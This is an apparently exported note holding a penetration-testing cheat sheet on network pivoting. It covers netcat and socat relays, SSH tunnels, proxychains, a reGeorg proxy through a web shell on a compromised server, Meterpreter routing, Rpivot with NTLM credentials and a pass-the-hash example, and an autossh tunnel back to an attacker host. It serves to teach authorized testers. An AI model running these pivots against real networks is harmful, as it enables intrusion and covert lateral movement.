<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/><meta name="exporter-version" content="Evernote Mac 6.13.1 (455785)"/><meta name="keywords" content="OSCP, Security"/><meta name="author" content="Anas"/><meta name="created" content="2018-01-05 04:25:45 +0000"/><meta name="source" content="Clearly"/><meta name="source-url" content="https://bitrot.sh/cheatsheet/14-12-2017-pivoting/"/><meta name="updated" content="2018-01-05 04:34:49 +0000"/><title>Network Pivoting Techniques</title></head><body><div><br/></div><div><div><h1>Network Pivoting Techniques</h1></div><h2>Basic Pivoting Types</h2><table style="border-collapse: collapse; min-width: 100%;"><colgroup><col style="width: 130px;"/><col style="width: 475px;"/></colgroup><tbody><tr><td style="width: 130px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Type</td><td style="width: 475px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Use Case</td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Listen - Listen</td><td style="width: 475px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Exposed asset, may not want to connect out.</td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Listen - Connect</td><td style="width: 475px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Normal redirect.</td></tr><tr><td style="width: 130px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Connect - Connect</td><td style="width: 475px; padding: 8px; border: 1px solid rgb(204, 204, 204);">Can’t bind, so connect to bridge two hosts</td></tr></tbody></table><h2>Listen - Listen</h2><h3>Netcat - Pivot Host</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat -v -l -p 8080 -c "ncat -v -l -p 9090"</div><h3>Socat - Pivot Host</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">socat -v tcp-listen:8080 tcp-listen:9090</div><h3>Remote host 1</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">We connect to the first side of the listen-&gt;listen trigger and send the file as input.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat localhost 8080 &lt; file</div><h3>Remote host 2</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">We connect to the second side of the listen-&gt;listen trigger and write the output to disk.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat localhost 9090 &gt; newfile</div><h2>Listen - Connect</h2><h3>Netcat - Pivot Host</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat -l -v -p 8080 -c "ncat localhost 9090"</div><h3>Socat - Pivot Host</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">socat -v tcp-listen:8080,reuseaddr tcp-connect:localhost:9090</div><h3>Remote host 1</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">We connect to the listen side of the listen-&gt;connect trigger and send file as input.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat localhost -p 8080 &lt; file</div><h3>Remote host 2</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">We wait and listen for the connect from the listen-&gt;connect trigger and write the file to disk.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat -l -p 9090 &gt; newfile</div><h2>Connect - Connect</h2><h3>Netcat - Pivot Host</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">Remote host listeners must be bound first.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat localhost 8080 -c "ncat localhost 9090"</div><h3>Socat - Pivot Host</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">Remote host listeners must be bound first.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">socat -v tcp-connect:localhost:8080,reuseaddr tcp-connect:localhost:9090</div><h3>Remote Host 1</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">We bind and listen to port 8080 and send the file as input.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat -l -p 8080 &lt; file</div><h3>Remote Host 2</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">We bind and listen to port 9090 and write the data to disk.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ncat -l -p 9090 &gt; newfile</div><h2><a href="https://bitrot.sh/cheatsheet/13-12-2017-ssh-cheatsheet/" target="_blank">SSH Tunnels</a></h2><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><span style="font-weight: bold;">Dynamic SOCKS Proxy</span></div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">This can be used with proxychains to forward client traffic through the remote server.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ssh -D8080 [user]@[host]</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><span style="font-weight: bold;">Local Port Forwarding</span></div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">This will bind to <span style="font-weight: bold;">[bindaddr]</span>:<span style="font-weight: bold;">[port]</span> on the client and forward through the SSH server to the <span style="font-weight: bold;">[dsthost]</span>:<span style="font-weight: bold;">[dstport]</span></div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ssh -L [bindaddr]:[port]:[dsthost]:[dstport] [user]@[host]</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><span style="font-weight: bold;">Remote Port Forwarding</span></div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">This will bind to <span style="font-weight: bold;">[bindaddr]</span>:<span style="font-weight: bold;">[port]</span> on the remote server and tunnel traffic through the ssh client side to <span style="font-weight: bold;">[localhost]</span>:<span style="font-weight: bold;">[localport]</span></div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ssh -R [bindaddr]:[port]:[localhost]:[localport] [user]@[host]</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><span style="font-weight: bold;">Establish VPN over SSH</span> The following options <span style="font-weight: bold;">must</span> be enabled on the server side.</div><div>PermitRootLogin yes</div><div>PermitTunnel yes</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">ssh [user]@[host] -w any:any</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">You can see the established tun interface by typing ifconfig -a</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">The interfaces and forwarding must still be configured. This assumes that we are going to forward 10.0.0.0/24 through the remote server. We are also assuming that the server’s main connection is through eth0, and both client/server stood up tun0. This may be different if you already have existing VPN connections.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><span style="font-weight: bold;">Client</span></div><div>ip addr add 192.168.5.2/32 peer 192.168.5.1 dev tun0</div><div># Once Server is setup, run the following to add routes</div><div>route add -net 10.0.0.0/24 gw 192.168.5.1</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><span style="font-weight: bold;">Server</span></div><div>ip addr add 192.168.5.1/32 peer 192.168.5.2 dev tun0</div><div>sysctl -w net.ipv4.ip_forward=1</div><div>iptables -t nat -A POSTROUTING -s 192.168.5.1 -o eth0 -j MASQUERADE</div><h2>Proxychains</h2><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">The configuration file in /etc/proxychains.conf must be edited to point towards your SOCKS proxy. Typically this is done with an SSH or other type of tunnel. Make sure your ports match.</div><div>[ProxyList]</div><div>socks4 localhost 8080</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">Now, in order to run any type of network through the proxy just run it like so. Remember, you can’t run any raw socket scans through a SOCKS4 proxy. You need to setup an SSH VPN tunnel or something similar for that type of functionality.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">proxychains nmap 192.168.5.6</div><h2>Web Shell SOCKSProxy (reGeorg)</h2><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><a href="https://github.com/sensepost/reGeorg" target="_blank">reGeorg</a> is a fantastic tool for using SOCKS proxies through a compromised web server. The delivery mechanism can be aspx,asph,jsp, or php. Simply upload the desired file to the webserver.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">python reGeorgSocksProxy.py -p 8080 -u http://compromised.host/shell.jsp</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">You are now free to use your regular tools using proxychains.</div><h2>Meterpreter</h2><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><a href="https://www.metasploit.com/" target="_blank">Meterpreter</a> allows you to create pivoting routes within the framework for use with any of the builtin modules. To automatically route, just use the following.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">run autoroute -s 192.168.5.1/24</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">To print routes</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">run autoroute -p</div><h3>Meterpreter - SOCKS Proxy</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">Now you can run other tools through Meterpreter using proxychains.</div><div>use auxiliary/server/socks4a</div><div>set SRVPORT 8080</div><div>run</div><h3>Forward single ports</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">Below will forward rdesktop sessions from localhost port 3389 to the target 192.168.5.9 through Meterpreter as a tunnel.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">portfwd add -L 127.0.0.1 -l 3389 -r 192.168.5.9 -p 3389</div><h2>Rpivot</h2><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><a href="https://github.com/artkond/rpivot" target="_blank">Rpivot</a> is a great SOCKS proxy based pivot tool that works like SSH’s dynamic proxy -D option, but it works in the reverse order.</div><h3>Server (Attacker box)</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">python server.py --proxy-port 1080 --server-port 9443 --server-ip 0.0.0.0</div><h3>Client (Compromised box)</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">python client.py --server-ip &lt;ip&gt; --server-port 9443</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">The Server will now have a SOCKS proxy on port 1080 that will forward traffic through the [client].</div><h3>Through corporate proxy</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">Rpivot also works through corporate proxies.</div><div>python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \</div><div>--ntlm-proxy-port 8080 --domain CORP --username jdoe --password 1q2w3e</div><h3>Passing the hash</h3><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">If you prefer passing the hash, then you’re also in luck.</div><div>python client.py --server-ip [server ip] --server-port 9443 --ntlm-proxy-ip [proxy ip] \</div><div>--ntlm-proxy-port 8080 --domain CORP --username jdoe \</div><div>--hashes 986D46921DDE3E58E03656362614DEFE:50C189A98FF73B39AAD3B435B51404EE</div><h2>AutoSSH</h2><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;"><a href="http://www.harding.motd.ca/autossh/" target="_blank">AutoSSH</a> is a tool that allows you to automatically restart SSH sessions and tunnels. The following line will open port 2222 on host attacker and tunnel it to the compromised host on port 22. You would then be able to setup a dynamic SSH SOCKS proxy and connect to localhost:2222 and be able to forward through the compromised host as normal.</div><div style="margin-top: 1em; margin-bottom: 1em;-en-paragraph:true;">autossh -M 0 -o "ServerAliveInterval 30" -o "ServerAliveCountMax 3" -L 2222:localhost:22 [evil]@[attacker]</div><h2>References</h2></div><div><br/></div></body></html>